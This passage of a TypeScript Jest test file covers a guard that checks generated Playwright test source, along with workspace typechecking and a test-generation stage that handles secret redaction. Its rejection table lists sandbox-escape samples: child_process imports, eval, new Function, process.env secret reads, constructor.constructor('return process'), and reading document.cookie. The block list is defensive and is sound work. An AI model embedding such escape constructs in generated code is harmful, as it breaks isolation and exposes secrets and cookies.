    ['const cp = require("child_process");', /require/],
    ['const fs = await import("node:fs");', /dynamic import/],
    ['eval("1 + 1");', /eval/],
    ['const f = new Function("return 1");', /Function/],
    ['import { exec } from "child_process";', /import.*child_process/],
    ['import * as fs from "fs";', /import.*fs/],
    ['import { readFileSync } from "node:fs";', /import.*node:fs/],
    ['import other from "./other";', /import.*\.\/other/],
    ['import cp = require("child_process");', /require/],
    ['export * from "fs";', /export/],
    ["process.exit(1);", /process/],
    ["const home = process.env.HOME;", /process/],
    ["const { env } = process;", /process/],
    ['const s = process["env"].SECRET_PASSWORD;', /process/],
    ["const lower = process.env.SECRET_password;", /process/],
    ["globalThis.fetch;", /globalThis/],
    ['const p = page.constructor.constructor("return process")();', /constructor/],
    ["const k = 'con' + 'structor'; const x = page[k];", /computed/],
    ["const u = import.meta.url;", /import\.meta/],
    ['await page.evaluate("document.cookie");', /evaluate/],
    ["await page.goto(", /syntax/i],
  ])("rejects %s", (source, why) => {
    const violations = checkGeneratedSource(source);
    expect(violations.length).toBeGreaterThan(0);
    expect(violations.join("\n")).toMatch(why);
  });
});

// ---------------------------------------------------------------------------------------------
// The generated workspace typechecks against @playwright/test (tsc --noEmit)
// ---------------------------------------------------------------------------------------------

const exec = promisify(execFile);
const requireHere = createRequire(import.meta.url);
const packageDir = (name: string) => path.dirname(realpathSync(requireHere.resolve(`${name}/package.json`)));

describe("generated workspace", () => {
  it("run.spec.ts + helpers.ts + run-data.json pass tsc --noEmit with @playwright/test installed", async () => {
    const steps = shopFlow({ fill: { inputRef: { source: "secret", key: "password" } } });
    const criteria: AcceptanceCriterion[] = [
      ...shopCriteria(),
      criterion("AC-6", { kind: "numeric_delta", before, after, delta: 1 }),
      criterion("AC-7", { kind: "text_matches", fact: { key: "message", checkpoint: "after_add" }, match: { mode: "regex", value: "^Added", caseSensitive: true } }),
      criterion("AC-8", { kind: "text_matches", fact: { key: "url", checkpoint: "after_add" }, match: { mode: "equals", value: "x", caseSensitive: false } }),
      criterion("AC-9", { kind: "collection_contains", collection: { key: "miniCart", checkpoint: "after_add" }, item: { key: "message", checkpoint: "after_add" }, match: "equals" }),
      criterion("AC-10", { kind: "numeric_compare", left: after, operator: "neq", right: 7 }),
      criterion("AC-11", { kind: "visible", fact: { key: "toast", checkpoint: "after_add" }, expected: false }),
    ];
    const out = compile({ steps, secretNames: ["password"], requirement: requirementOf(criteria) });
    expect(out.compiledCriteria).toHaveLength(10);
    expect(checkGeneratedSource(out.source)).toEqual([]);

    const dir = mkdtempSync(path.join(os.tmpdir(), "generated-test-tsc-"));
    try {
      writeFileSync(path.join(dir, "run.spec.ts"), out.source);
      writeFileSync(path.join(dir, "helpers.ts"), out.helpersSource);
      writeFileSync(path.join(dir, "run-data.json"), out.dataJson);
      writeFileSync(
        path.join(dir, "tsconfig.json"),
        JSON.stringify({
          compilerOptions: {
            target: "ES2022",
            module: "ESNext",
            moduleResolution: "Bundler",
            strict: true,
            noUncheckedIndexedAccess: true,
            resolveJsonModule: true,
            esModuleInterop: true,
            skipLibCheck: true,
            noEmit: true,
            types: ["node"],
          },
          files: ["run.spec.ts", "helpers.ts"],
        }),
      );
      mkdirSync(path.join(dir, "node_modules", "@playwright"), { recursive: true });
      mkdirSync(path.join(dir, "node_modules", "@types"), { recursive: true });
      symlinkSync(packageDir("@playwright/test"), path.join(dir, "node_modules", "@playwright", "test"));
      symlinkSync(packageDir("@types/node"), path.join(dir, "node_modules", "@types", "node"));
      const tsc = path.join(packageDir("typescript"), "bin", "tsc");
      const result = await exec(process.execPath, [tsc, "-p", path.join(dir, "tsconfig.json")]).then(
        () => "",
        (err: { stdout?: string; stderr?: string }) => `${err.stdout ?? ""}${err.stderr ?? ""}`,
      );
      expect(result).toBe("");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------------------------
// The GENERATING_TEST stage (Rulings R28, R29, R34)
// ---------------------------------------------------------------------------------------------

describe("createGenerateTestStage", () => {
  const SECRET = "pw-Stage-Secret-1";
  const ctxWith = (testData: Record<string, TestDataValue>, published: unknown[]) =>
    ({
      runId: "run_1",
      tenantId: "tenant_1",
      request: { targetUrl: TARGET, testData, secretNames: ["password"] },
      secrets: { names: ["password"], get: () => SECRET },
      redact: (v: unknown) => JSON.parse(JSON.stringify(v).replaceAll("Top-Sekret-Label", "[REDACTED]")),
      publish: async (e: unknown) => void published.push(e),
    }) as unknown as StageContext;

  const stageInput = (steps = shopFlow(), facts = shopFacts()) => {
    const criteria = shopCriteria();
    return {
      requirement: requirementOf(criteria),
      plan,
      exploration: { steps, facts, stopReason: "COMPLETED" as const },
      provisional: provisionalOf(criteria),
    };
  };

  it("compiles with the run's test data and secret names, assigns an id, redacts, persists, and does not publish (R34)", async () => {
    const saved: unknown[] = [];
    const published: unknown[] = [];
    const store: GeneratedTestStore = { save: async (t) => void saved.push(t) };
    const stage = createGenerateTestStage({ store: () => store });
    const steps = shopFlow({ productName: "Top-Sekret-Label", fill: { inputRef: { source: "testData", key: "query" } } });

    const test = await stage(ctxWith({ query: "iPhone" }, published), stageInput(steps));

    expect(test).not.toBeNull();
    expect(test!.id).toMatch(/^gt_[a-z0-9]+$/);
    expect(GeneratedTestSchema.parse(test)).toEqual(test);
    expect(test!.compiledCriteria).toEqual(["AC-1", "AC-2", "AC-3", "AC-4"]);
    expect(dataOf(test!.dataJson).inputs.input1).toBe("iPhone");
    expect(test!.dataJson).not.toContain("Top-Sekret-Label");
    expect(JSON.stringify(test)).not.toContain(SECRET);
    expect(saved).toEqual([test]);
    expect(published).toEqual([]);
  });

  it("nothing compilable → no generated test (null), nothing persisted", async () => {
    const saved: unknown[] = [];
    const stage = createGenerateTestStage({ store: () => ({ save: async (t) => void saved.push(t) }) });
    const facts = shopFacts().map((f) => ({ ...f, provenance: "MODEL_EXTRACTED" as const }));
    expect(await stage(ctxWith({}, []), stageInput(shopFlow(), facts))).toBeNull();
    expect(saved).toEqual([]);
  });

  // Ruling R45: a generateTest failure degrades like a rerun failure — logged, no generated test.
  const breaksSource = (v: unknown) => {
    const t = v as { source?: string };
    return typeof t.source === "string" ? { ...t, source: `${t.source}\nrequire("child_process"); // ${SECRET}` } : v;
  };

  it("a compiler failure (here: the redacted source fails the guard) → null, nothing persisted; the cause logged, redacted (R45)", async () => {
    const saved: unknown[] = [];
    const logged: { obj: Record<string, unknown>; msg?: string | undefined }[] = [];
    const logger = { error: (obj: object, msg?: string) => void logged.push({ obj: obj as Record<string, unknown>, msg }) };
    const stage = createGenerateTestStage({ store: () => ({ save: async (t) => void saved.push(t) }), logger });
    const ctx = { ...ctxWith({}, []), signal: new AbortController().signal, redact: breaksSource } as unknown as StageContext;

    expect(await stage(ctx, stageInput())).toBeNull();
    expect(saved).toEqual([]);
    expect(logged).toHaveLength(1);
    expect(logged[0]).toMatchObject({ obj: { runId: "run_1", err: { name: "GeneratedSourceRejectedError" } }, msg: expect.stringMatching(/generated test could not be compiled/) });
  });

  it("the run's own abort still propagates from GENERATING_TEST (R45)", async () => {
    const controller = new AbortController();
    const reason = new Error("run cancelled");
    controller.abort(reason);
    const stage = createGenerateTestStage({ store: () => ({ save: async () => {} }) });
    const ctx = { ...ctxWith({}, []), signal: controller.signal, redact: breaksSource } as unknown as StageContext;
    await expect(stage(ctx, stageInput())).rejects.toBe(reason);
  });
});
